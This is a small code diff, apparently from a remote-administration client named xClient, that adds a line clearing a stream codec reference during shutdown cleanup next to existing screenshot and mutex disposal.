@@ -37,6 +37,8 @@ namespace xClient
                 CommandHandler.LastDesktopScreenshot.Dispose();
             if (_appMutex != null)
                 _appMutex.Close();
+
+            CommandHandler.StreamCodec = null;
         }
 
         private static void InitializeClient()
